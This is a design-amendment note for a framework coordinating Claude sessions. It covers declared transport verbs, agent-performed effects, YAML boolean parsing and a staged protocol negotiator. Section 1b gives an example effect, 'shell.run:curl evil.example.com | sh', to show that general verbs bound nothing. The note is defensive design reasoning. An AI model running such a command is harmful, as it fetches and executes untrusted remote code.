# Design changes agreed after the `machines` spec merged

**Written** 2026-09-14, during cycle A. **Amends**
`docs/superpowers/specs/2026-09-14-machines-framework-design.md`, merged in
`PR: claude-operating-rules#29`. **Tracked in** `claude-operating-rules#28`.

This file exists so these decisions are not held only in a session transcript — the failure
`claude-operating-rules#24` documents. **Fold each one into the spec and delete this file
when cycle A closes.**

---

## 1. The effect vocabulary is not fixed; transports declare verbs

**Supersedes** §7's "a fixed effect vocabulary" and the three effects
(`label.add:<name>`, `label.remove:<name>`, `escalate`) that cycle A implements.

Those three were reverse-engineered from one protocol's needs. Freezing them into the
framework is the "generalising from one instance" failure `#26`'s body warns about, and a
machine that can only do those three is not doing work in any general sense.

**The replacement.** A transport **declares the verb set it implements**. A machine's
effects **name** verbs and supply arguments. The machine holds no code — it holds a verb
name. The implementation lives in the transport, which is already publisher code with a
trust decision at install, so this adds no new trust surface; it widens the narrow cut of
§8 from four fixed verbs to a declared set.

**This buys a new install-time guarantee**, of exactly the kind the framework exists for:

```
machine `foo` requires effect `github.label.add`
transport `github-issues` declares: comment.post, label.add, label.remove
→ install error, before anything runs
```

A machine whose effects its transport cannot perform is today a runtime failure halfway
through a conversation. Under this it is caught statically, like a prefix collision.

**The cost, stated rather than hidden:** a new verb means shipping a transport, not editing
a declaration. If that inconvenience dominates in practice, that is evidence, and the line
should be revisited rather than defended.

### 1a. A verb declares a typed argument schema, not just a name

A transport declares `label.add(name: string)`, not bare `label.add`. **The checker
validates at install that every argument a machine supplies conforms** — so a machine
naming a verb with the wrong arity or the wrong type is an install error, alongside a
prefix collision and a missing verb.

### 1b. The correction this forced: what the boundary actually is

An earlier draft of this design argued the safety property as *"a declaration is data,
never code."* **That statement is too strong and the reasoning behind it was wrong.**

A declaration does not need to embed a script to carry code. It only needs a transport that
offers a verb whose *argument* is one:

```yaml
effects: ["shell.run:curl evil.example.com | sh"]
```

That is data. The machine holds no code. It names a verb and supplies a string. Every check
still passes, and every guarantee is gone.

**The boundary, stated correctly:**

> A machine's power is bounded by the verb set its transport declares — **and that bound is
> only as tight as the verbs are specific.** `github.label.add(name: string)` is a tight
> bound. `shell.run(cmd: string)` is no bound at all.

**A transport whose verbs are general is not a defect to be prevented; it is a fact to be
disclosed.** A shell-script transport is legitimate and is probably the first one anyone
writes — `session-relay`'s own transport is `gh issue view --comments`, `gh issue comment`
and `gh label`, which is a shell script. What matters is that a transport must **name its
verbs out loud**: they appear in the declared set, `/machines:install` shows them, and a
user consents knowing whether the machine can be told to run arbitrary commands.

**Do not attempt to fix this with sandboxing or a capability allowlist.** An unenforced list
that reads like a guarantee is the failure this repository documents, and enforcement here
would need a sandbox that must then be kept correct for ever. Disclosure that holds beats
enforcement that does not. A transport doing shell execution behind a verb named
`comment.post` is simply lying — no design stops code from lying, and the install-time
consent exists for precisely that residue.

## 2. An effect may also require an action from Claude

**Extends** §6's verdict shape.

An effect may name an action for Claude rather than for the transport. The engine still
executes nothing — it requires, and Claude performs under its own tool permissions.

**The principle this rests on, which should be stated in the spec because it is the
capability model:**

> The engine can never *execute*. It can only *require*. There are exactly two performers:
> the transport (code, authorised by the user at install, having been told it ships code)
> and Claude (tools, authorised through the harness's permission system).
>
> **A machine's power is the union of what its transport offers and what Claude is
> permitted to do — and its author controls neither. A publisher cannot grant themselves
> capability by writing a declaration.**

"No code in the declaration" is what makes that hold. It is the capability model, not a
limitation dressed as a virtue.

### The mitigation this change requires

Adding agent-effects costs something real: a reader of a thread can no longer tell what the
protocol **demanded** from what Claude **chose**, and that boundary is what stops the
framework appearing to check meaning.

**So the verdict must separate them, and the durable record must carry the required set:**

```
verdict.effects.transport[]   performed by installed code, under install-time consent
verdict.effects.agent[]       performed by Claude, under its own tool permissions
```

The protocol comment header records which effects were required. "The machine made me do
this" is then checkable after the fact by a person reading the issue — the only place it
can be checked.

## 3. The declaration language's scalar semantics are part of the language

**Belongs in** §7, and was found by implementation rather than by design.

PyYAML resolves YAML **1.1** implicit booleans, so `on`, `off`, `yes` and `no` become
booleans in every scalar position — a mapping key, the value under it, an entry in `kinds`,
a state name, a role name, a `holder`. The corruption is **self-consistent**: a machine
declaring a kind `yes` and a transition `on: yes` compares `True in {True}` and passes every
downstream check. Nothing detects it.

**The rule:** the declaration resolves `true` and `false` (and case variants) as booleans,
and every other bare scalar as a string. Implemented as a `SafeLoader` subclass narrowing
the implicit resolver, applied in one place. `signal: yes` is therefore a type error, not a
synonym for true, and `SCHEMA.md` says so.

**Why this belongs in the spec and not only in the code.** §7 argues the closed language is
safe because it cannot express computation. That is true and insufficient: a closed language
can still be **silently mis-parsed**, and then the machine that runs is not the machine that
was written. This is the `#17` shape — a rule that was correct and never fired — arriving one
layer lower, in the parser rather than in prose. **A closed language needs stated scalar
semantics, or "closed" does not mean what the spec claims it means.**

## 4. A protocol negotiator, in three stages

**New. Not in the spec at all.** Agreed as scope after cycles A–D, sequenced so each stage
is useful alone and de-risks the next.

**The bootstrap is not circular.** `#26`'s first objection says a negotiation framework is
itself a protocol, so a floor must exist that nobody negotiates. The floor already exists —
the dispatcher, the prefix, and "no machine claims this". The negotiator is **a declared
machine shipped built-in, with a fixed prefix, always installed, never negotiated.** It gets
a cap, terminal states and a termination proof from the same checker as everything else: a
negotiation that cannot terminate is caught by the machinery it negotiates with.

### Stage 1 — the offer (fold into cycle D; cheap)

When no machine claims a conversation, say so and offer to help declare one. The dispatcher
already must report an unclaimed prefix rather than drop it; this extends the report into an
offer. It is a skill, not a mechanism.

**Why first:** without it, only someone who already knows the framework exists will ever use
it. That is the discoverability trap `session-relay`'s "offer once" rule was written to
solve.

### Stage 2 — selection, and role occupancy

A built-in negotiator machine lets sessions agree which **already-installed** machine to
use. No authorship: a handshake over the intersection of what each side holds.

**The dynamic cluster is role occupancy, not participant creation.** A machine declares N
roles, fixed at declaration time. A session joins by taking a vacant role and leaves by
releasing it. Roles are fixed; who holds them is dynamic.

**Why the line is there.** Dynamic join and leave with unbounded participants is full
π-calculus mobility, which §7 forbids because the properties go undecidable — costing the
install-time check, the one thing the framework exists for. A fixed role set stays inside
multiparty session types, where projection to per-role machines is the solved problem §"Prior
art" already names. The undecidable version buys unbounded *new* roles, which is not what
was asked for.

### Stage 3 — authorship

Sessions author a new declaration; the checker gates it; a person adopts it.

**The property that makes this safe:** negotiation produces **data, never code**. A
negotiated machine composes an **already-installed** transport with a **new declaration**.
Two sessions inventing a protocol cannot introduce executable anything — they are filling in
a form whose grammar the checker validates.

**The division of labour, which is the whole design:**

| Who | Does |
|---|---|
| the sessions | the creative part — what states, what kinds, what the protocol should be |
| the checker | the deterministic part — well-formedness, termination, cap, prefix collision |
| the person | the authorising part — adoption |

Nothing is adopted because two sessions agreed it was fine.

**This is the cure for `#24`, not a relapse into it.** The failure there was never
invention — the six conventions were all good rules. It was that the agreements were
invisible, pair-specific, renegotiated each time, and detectable only by a person watching.
A negotiated machine that is written to a file, checked, and surfaced has none of those four
properties.

**Change 2 raises the stakes here and the gate must account for it.** A negotiated machine
can name agent-effects, so two sessions are no longer only agreeing turn-taking — they are
authoring something that can require Claude to act. A negotiated machine is **inert until a
person adopts it**, and adoption is explicit.
